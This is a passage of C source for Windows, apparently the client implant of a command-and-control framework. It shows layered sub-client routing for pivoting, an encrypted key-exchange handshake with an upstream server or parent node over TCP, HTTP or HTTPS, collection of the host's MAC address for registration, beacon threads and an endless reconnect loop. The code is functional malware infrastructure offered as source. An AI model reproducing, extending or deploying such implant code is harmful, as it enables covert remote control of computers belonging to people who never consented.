                    PendingRoute *cur = pending_list;
                    while (cur) {
                        if (cur->conn == listener->client_conn) {
                            p = cur; break;
                        }
                        cur = cur->next;
                    }
                    if (p) {
                        PendingRoute **pp = &pending_list;
                        while (*pp) {
                            if (*pp == p) { *pp = p->next; break; }
                            pp = &((*pp)->next);
                        }
                    }
                    LeaveCriticalSection(&pending_list_mutex);
 
                    if (p) {
                        EnterCriticalSection(&routing_table_mutex);
                        add_route_entry_full(new_child_id,
                                             p->conn, p->trans, port,
                                             p->key_enc, p->base_iv,
                                             p->tx_ctr, p->rx_ctr);
                        LeaveCriticalSection(&routing_table_mutex);
 
                        EnterCriticalSection(&p->mu);
                        snprintf(p->assigned_id, ID_LEN, "%s", new_child_id);
                        p->route_assigned = TRUE;
                        WakeConditionVariable(&p->route_ready);
                        LeaveCriticalSection(&p->mu);
 
                        printf("[ROUTING] Sub-client %s registered on port %d,"
                               " CV marked\n", new_child_id, port);
                    } else {
                        printf("[WARNING] PendingRoute not found on port %d\n",
                               port);
                    }
 
                } else {
                    /*
                     * (target_level > LEVEL_CLIENT+1).
                     *
                     * Two actions required:
                     *
                     * 1. add_route_entry_full for new_child_id
                     *
                     * 2. Forward 0x0D to the father through send_packet_route,
                     *    to let the father register the new routing.
                     *
                     */
                    EnterCriticalSection(&routing_table_mutex);
                    RouteTable *father_route = routing_table;
                    while (father_route) {
                        if (strncmp(father_route->client_id, id_father,
                                    ID_LEN) == 0)
                            break;
                        father_route = father_route->next;
                    }
                    if (father_route) {
                        // 1
                        add_route_entry_full(new_child_id,
                                             father_route->conn,
                                             father_route->trans,
                                             father_route->port,
                                             father_route->key_enc,
                                             father_route->base_iv,
                                             father_route->tx_ctr,
                                             father_route->rx_ctr);
                        // 2
                        int rc = send_packet_route(&received_packet,
                                                   father_route);
                        LeaveCriticalSection(&routing_table_mutex);
                        if (rc < 0)
                            printf("[0x0D FORWARD] Error to %s\n",
                                   id_father);
                        else
                            printf("[0x0D FORWARD] Forwarding to %s,"
                                   " route added for %s\n",
                                   id_father, new_child_id);
                    } else {
                        LeaveCriticalSection(&routing_table_mutex);
                        printf("[0x0D FORWARD] No route for father %s\n",
                               id_father);
                    }
                }
 
            /* -- others opcode not fo me: forward via routing -- */
            } else {
                EnterCriticalSection(&routing_table_mutex);
                RouteTable *route = routing_table;
                while (route) {
                    if (strncmp(route->client_id,
                                received_packet.target_id, ID_LEN) == 0)
                        break;
                    route = route->next;
                }
                if (route) {
                    int rc = send_packet_route(&received_packet, route);
                    LeaveCriticalSection(&routing_table_mutex);
                    if (rc < 0)
                        printf("[FORWARD] Error sending to child %s\n",
                               received_packet.target_id);
                    else
                        printf("[FORWARD] Packet forwarded to %s\n",
                               received_packet.target_id);
                } else {
                    LeaveCriticalSection(&routing_table_mutex);
                    printf("[FORWARD] No route for: %s\n",
                           received_packet.target_id);
                }
            }
        }
    }
    return 0;
}

/* =========================================================================
 * get_socket_mac_address
 *
 * Retrieves the MAC address of the network adapter associated with
 * the given connection. For socket-based transports (TCP, SMB),
 * matches the local IP. For non-socket transports (HTTP, HTTPS),
 * returns the first non-loopback adapter's MAC as a fallback.
 * Writes a "XX:XX:XX:XX:XX:XX" string into mac (18 bytes).
 * ====================================================================== */

void get_socket_mac_address(transport_conn_t *conn,
                             transport_t      *trans,
                             char             *mac)
{
    /* -- fallback per transport senza socket diretto (es. HTTP) -- */
    if (trans->get_fd(conn) == -1) {
        ULONG buf_size = 15000;
        PIP_ADAPTER_ADDRESSES addrs = malloc(buf_size);
        if (addrs && GetAdaptersAddresses(AF_INET, GAA_FLAG_INCLUDE_PREFIX,
                                          NULL, addrs, &buf_size) == NO_ERROR) {
            for (PIP_ADAPTER_ADDRESSES a = addrs; a; a = a->Next) {
                if (a->IfType != IF_TYPE_SOFTWARE_LOOPBACK &&
                    a->PhysicalAddressLength == 6) {
                    snprintf(mac, 18,
                             "%02X:%02X:%02X:%02X:%02X:%02X",
                             a->PhysicalAddress[0], a->PhysicalAddress[1],
                             a->PhysicalAddress[2], a->PhysicalAddress[3],
                             a->PhysicalAddress[4], a->PhysicalAddress[5]);
                    free(addrs);
                    return;
                }
            }
        }
        free(addrs);
        strncpy(mac, "00:00:00:00:00:00", 18);
        return;
    }

    int sock = trans->get_fd(conn);
    struct sockaddr_in local_addr;
    int addr_len = sizeof(local_addr);
    if (getsockname(sock, (struct sockaddr*)&local_addr, &addr_len) == SOCKET_ERROR) {
        perror("getsockname failed");
        exit(EXIT_FAILURE);
    }
    ULONG buffer_size = 15000;
    PIP_ADAPTER_ADDRESSES adapter_addresses = malloc(buffer_size);
    if (GetAdaptersAddresses(AF_INET, GAA_FLAG_INCLUDE_PREFIX,
                             NULL, adapter_addresses, &buffer_size) != NO_ERROR) {
        printf("GetAdaptersAddresses failed\n");
        free(adapter_addresses);
        exit(EXIT_FAILURE);
    }
    PIP_ADAPTER_ADDRESSES adapter = adapter_addresses;
    while (adapter) {
        PIP_ADAPTER_UNICAST_ADDRESS unicast = adapter->FirstUnicastAddress;
        while (unicast) {
            struct sockaddr_in *addr =
                (struct sockaddr_in *)unicast->Address.lpSockaddr;
            if (addr->sin_addr.s_addr == local_addr.sin_addr.s_addr) {
                snprintf(mac, 18,
                         "%02X:%02X:%02X:%02X:%02X:%02X",
                         adapter->PhysicalAddress[0],
                         adapter->PhysicalAddress[1],
                         adapter->PhysicalAddress[2],
                         adapter->PhysicalAddress[3],
                         adapter->PhysicalAddress[4],
                         adapter->PhysicalAddress[5]);
                free(adapter_addresses);
                return;
            }
            unicast = unicast->Next;
        }
        adapter = adapter->Next;
    }
    printf("No matching adapter found for the socket\n");
    free(adapter_addresses);
    exit(EXIT_FAILURE);
}

/* =========================================================================
 * handle_connection
 *
 * Performs the initial handshake and registration sequence.
 * Level 1: ECDH with server, send MAC, receive client ID.
 * Level > 1: ECDH with father, relay handshake to server via
 * father, derive end-to-end keys, receive client ID.
 * After registration, spawns receiveFromServer and blocks until
 * the connection ends.
 * ====================================================================== */

void handle_connection(transport_conn_t *conn, transport_t *trans) {
    PACKET_DRAGON packet = {0};
    char payload[128];
    char mac_address[18];

    /* -- SUB-CLIENT (LEVEL > 1) -- */
    if (LEVEL_CLIENT > 1) {

        /*
         * Handshake with the father.
         * In TCP: dragon_handshake_with_father() - father sends pub_father
         *         and after the child sends pub_client.
         * In HTTP: the child do POST /c2/hs with pub_client and receives pub_father
         *          in the same response.
         *          Uses dragon_handshake_client() with FATHER_PUB hardcoded,
         *          after the activation of the hs_mode.
         */
        if (IS_HTTP) {
            http_set_hs_mode(conn, 1);
            if (dragon_handshake_http_child(conn, trans,
                                        key_enc_father, base_iv_father) != 0) {
                http_set_hs_mode(conn, 0);
                printf("[CRYPTO] HTTP handshake with father failed\n");
                trans->close(conn); WSACleanup(); return;
            }
            http_set_hs_mode(conn, 0);
        } else if (IS_HTTPS) {     
        printf("[DEBUG] IS_HTTPS: active hs_mode\n"); fflush(stdout);
        https_set_hs_mode(conn, 1);
        printf("[DEBUG] IS_HTTPS: call dragon_handshake_http_child\n"); fflush(stdout);
        if (dragon_handshake_http_child(conn, trans,
                                        key_enc_father, base_iv_father) != 0) {
            https_set_hs_mode(conn, 0);
            printf("[CRYPTO] HTTPS handshake with father failed\n");
            trans->close(conn); WSACleanup(); return;
        }
        printf("[DEBUG] IS_HTTPS: handshake ok\n"); fflush(stdout);
        https_set_hs_mode(conn, 0);
        } else {
            if (dragon_handshake_with_father(conn, trans,
                                             key_enc_father,
                                             base_iv_father) != 0) {
                printf("[CRYPTO] handshake with father failed\n");
                trans->close(conn); WSACleanup(); return;
            }
        }

        tx_ctr_father = rx_ctr_father = 0;

        /* Received father_id (0x00) */
        if (receive_packet(conn, trans, &packet,
                           key_enc_father, base_iv_father,
                           &rx_ctr_father) != 0
            || strncmp(packet.opCode, "0x00", OPCODE_LEN) != 0)
        {
            printf("[ERROR] Failed to receive father ID\n");
            trans->close(conn); WSACleanup(); return;
        }
        printf("0x00 with father ID received\n");
        snprintf(father_id, ID_LEN, "%s", packet.payload);

        /* Send MAC|father_id|father_port to the server (through father) */
        memset(&packet, 0, sizeof(packet));
        get_socket_mac_address(conn, trans, mac_address);
        snprintf(payload, sizeof(payload), "%s|%s|%d",
                 mac_address, father_id, FATHER_PORT);
        snprintf(packet.opCode, OPCODE_LEN, "%s", "0x00");
        snprintf(packet.payload, sizeof(packet.payload), "%s", payload);
        packet.payload_size = (uint16_t)strlen(packet.payload);
        packet.target_level = LEVEL_CLIENT;

        if (send_packet(conn, trans, &packet,
                        key_enc_father, base_iv_father, &tx_ctr_father) < 0) {
            printf("[ERROR] Failed to send init to server (via father)\n");
            trans->close(conn); WSACleanup(); return;
        }
        printf("0x00 send to the father mac|id|port\n");

        /* Send ephemeral pubkey to the server (0x10) */
        uint8_t sub_cli_pub[32], sub_cli_priv[32];
        crypto_box_keypair(sub_cli_pub, sub_cli_priv);

        PACKET_DRAGON hs_relay = {0};
        snprintf(hs_relay.opCode, OPCODE_LEN, "%s", "0x10");
        memcpy(hs_relay.payload, sub_cli_pub, 32);
        hs_relay.payload_size = 32;
        hs_relay.target_level = LEVEL_CLIENT;
        snprintf(hs_relay.target_id, ID_LEN, "%s", "SERVER");

        if (send_packet(conn, trans, &hs_relay,
                        key_enc_father, base_iv_father, &tx_ctr_father) < 0) {
            printf("[ERROR] Failed to send ephemeral pubkey\n");
            trans->close(conn); WSACleanup(); return;
        }

        /* Receive ACK 0x11 */
        memset(&packet, 0, sizeof(packet));
        if (receive_packet(conn, trans, &packet,
                           key_enc_father, base_iv_father,
                           &rx_ctr_father) != 0
            || strncmp(packet.opCode, "0x11", OPCODE_LEN) != 0)
        {
            printf("[ERROR] Failed to receive handshake response\n");
            trans->close(conn); WSACleanup(); return;
        }

        /* Derives keys with the server */
        uint8_t shared[32];
        if (crypto_scalarmult(shared, sub_cli_priv, SERVER_PUB) != 0) {
            printf("[CRYPTO] Shared secret generation failed\n");
            trans->close(conn); WSACleanup(); return;
        }
        uint8_t km[64];
        crypto_kdf_derive_from_key(km, 64, 0x01, "DRAGONHS", shared);
        crypto_generichash(key_enc,   KEY_LEN,  km, 64, (uint8_t*)"enc", 3);
        crypto_generichash(base_iv,   NONCE_LEN,km, 64, (uint8_t*)"iv",  2);
        crypto_generichash(chain_key, KEY_LEN,  km, 64, (uint8_t*)"ck",  2);
        sodium_memzero(shared, sizeof shared);
        sodium_memzero(km,     sizeof km);
        tx_ctr = rx_ctr = 0;

        if (consume_handshake_blob(&packet) != 0) {
            printf("[ERROR] Failed consume blob 0x11\n");
            trans->close(conn); WSACleanup(); return;
        }

        /* Send 0x13 (ready to receive ID) */
        PACKET_DRAGON confirm = {0};
        snprintf(confirm.opCode, OPCODE_LEN, "%s", "0x13");
        confirm.target_level = LEVEL_CLIENT;
        snprintf(confirm.target_id, ID_LEN, "%s", "SERVER");

        if (send_packet(conn, trans, &confirm,
                        key_enc_father, base_iv_father, &tx_ctr_father) < 0) {
            printf("[ERROR] Failed to send 0x13\n");
            trans->close(conn); WSACleanup(); return;
        }

        /* Receive 0x12 with client_id */
        memset(&packet, 0, sizeof(packet));
        if (receive_packet(conn, trans, &packet,
                           key_enc_father, base_iv_father,
                           &rx_ctr_father) != 0
            || strncmp(packet.opCode, "0x12", OPCODE_LEN) != 0)
        {
            printf("[ERROR] Failed to receive client ID\n");
            trans->close(conn); WSACleanup(); return;
        }
        if (consume_handshake_blob(&packet) != 0) {
            printf("[ERROR] Failed consume blob 0x12\n");
            trans->close(conn); WSACleanup(); return;
        }
        snprintf(current_id, ID_LEN, "%s", packet.target_id);
        printf("[INFO] Assigned client ID: %s\n", current_id);
    }

    /* -- FIRST LEVEL CLIENT -- */
    else if (LEVEL_CLIENT == 1) {

        /* Handshake with the server - active hs_mode on HTTP */
        printf("[DEBUG] active hs_mode\n");
        if (IS_HTTP) http_set_hs_mode(conn, 1);
        if (IS_HTTPS) https_set_hs_mode(conn, 1);

        printf("[DEBUG] call dragon_handshake_client\n");
        if (dragon_handshake_client(conn, trans, SERVER_PUB, key_enc, base_iv, chain_key) != 0) {
            if (IS_HTTP) http_set_hs_mode(conn, 0);
            if (IS_HTTPS) https_set_hs_mode(conn, 0);
            printf("[CRYPTO] handshake with server failed\n");
            trans->close(conn); WSACleanup(); return;
        }
        printf("[DEBUG] handshake completed\n");
        if (IS_HTTP) http_set_hs_mode(conn, 0);
        if (IS_HTTPS) https_set_hs_mode(conn, 0);

        tx_ctr = rx_ctr = 0;

        /* Send init (MAC||father_port) */
        get_socket_mac_address(conn, trans, mac_address);
        snprintf(payload, sizeof(payload), "%s||%d", mac_address, FATHER_PORT);

        memset(&packet, 0, sizeof(packet));
        snprintf(packet.opCode, OPCODE_LEN, "%s", "0x00");
        snprintf(packet.payload, sizeof(packet.payload), "%s", payload);
        packet.payload_size = (uint16_t)strlen(packet.payload);
        packet.target_level = LEVEL_CLIENT;

        if (send_packet(conn, trans, &packet,
                        key_enc, base_iv, &tx_ctr) < 0) {
            printf("[ERROR] Failed to send init to server\n");
            trans->close(conn); WSACleanup(); return;
        }

        /* Receive client_id */
        memset(&packet, 0, sizeof(packet));
        if (receive_packet(conn, trans, &packet,
                           key_enc, base_iv, &rx_ctr) != 0) {
            printf("[ERROR] Failed to receive client ID\n");
            trans->close(conn); WSACleanup(); return;
        }
        snprintf(current_id, ID_LEN, "%s", packet.target_id);
        printf("[INFO] Assigned client ID: %s\n", current_id);
    }

    /* Run thread for receiving */
    ThreadConn *ctx = malloc(sizeof(ThreadConn));
    ctx->conn  = conn;
    ctx->trans = trans;
    HANDLE threadReceive = CreateThread(NULL, 0, receiveFromServer,
                                        (LPVOID)ctx, 0, NULL);
    
    BEACON_CTX *bctx = malloc(sizeof(BEACON_CTX));
    bctx->conn  = conn;
    bctx->trans = trans;
    HANDLE threadBeacon = CreateThread(NULL, 0, sendBeacons,
                                        (LPVOID)bctx, 0, NULL);
    if (threadBeacon) CloseHandle(threadBeacon);
    
    WaitForSingleObject(threadReceive, INFINITE);
}

/* =========================================================================
 * http_beacon_loop
 *
 * Reconnection loop for HTTP and HTTPS transports. Calls
 * handle_connection, and when it returns (connection lost),
 * reconnects after a 5-second delay. Repeats forever.
 * ====================================================================== */

static void http_beacon_loop(transport_conn_t *conn, transport_t *trans)
{
    /*
     * handle_connection() runs receiveFromServer() and waiting for its end.
     * When conection goes down: reconnection.
     * On HTTP is not used the thread sendBeacons.
     */
    handle_connection(conn, trans);

    while (1) {
        printf("[HTTP] connection lost, reconnecting in 5s...\n");
        Sleep(5000);

        const char *host = (LEVEL_CLIENT == 1) ? SERVER_IP  : FATHER_IP;
        int         port = (LEVEL_CLIENT == 1) ? SERVER_PORT : FATHER_PORT;

        conn = trans->connect(host, port);
        if (!conn) { printf("[HTTP] reconnect failed\n"); continue; }

        upstream_conn = conn;
        handle_connection(conn, trans);
    }
}

/* =========================================================================
 * main
 *
 * Entry point. Initializes Winsock, libsodium, and all critical
 * sections. Resolves the upstream transport, connects to the server
 * (level 1) or father (level > 1), and enters the appropriate
 * connection loop.
 * ====================================================================== */

int main(void) {

    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        printf("WSAStartup failed.\n");
        return 1;
    }
    if (sodium_init() < 0) {
        printf("libsodium init failed\n");
        return 1;
    }

    InitializeCriticalSection(&send_mutex);
    InitializeCriticalSection(&listener_list_mutex);
    InitializeCriticalSection(&routing_table_mutex);
    InitializeCriticalSection(&ctr_mutex);
    InitializeCriticalSection(&pending_list_mutex);
    listener_list = NULL;

    upstream_trans = transport_get(UPSTREAM_TRANSPORT);
    if (!upstream_trans) {
        printf("Transport %s not found\n", UPSTREAM_TRANSPORT);
        return 1;
    }

    const char *up_host = (LEVEL_CLIENT == 1) ? SERVER_IP  : FATHER_IP;
    int         up_port = (LEVEL_CLIENT == 1) ? SERVER_PORT : FATHER_PORT;

    printf("[DEBUG] transport found: %s\n", upstream_trans->name);
    printf("[DEBUG] connection to %s:%d\n", up_host, up_port);

    upstream_conn = upstream_trans->connect(up_host, up_port);

    printf("[DEBUG] connect returned: %p\n", (void*)upstream_conn);
    if (!upstream_conn) {
        printf("Connection failed\n");
        WSACleanup();
        return 1;
    }
    printf("Connected.\n");

    if (IS_HTTP) {
        printf("[HTTP] starting HTTP mode\n");
        http_beacon_loop(upstream_conn, upstream_trans);
    } else if (IS_HTTPS) {
        printf("[HTTPS] starting HTTPS mode\n");
        http_beacon_loop(upstream_conn, upstream_trans);
    } else {
        handle_connection(upstream_conn, upstream_trans);
        upstream_trans->close(upstream_conn);
    }

    DeleteCriticalSection(&send_mutex);
    DeleteCriticalSection(&listener_list_mutex);
    DeleteCriticalSection(&routing_table_mutex);
    DeleteCriticalSection(&ctr_mutex);
    WSACleanup();
    return 0;
}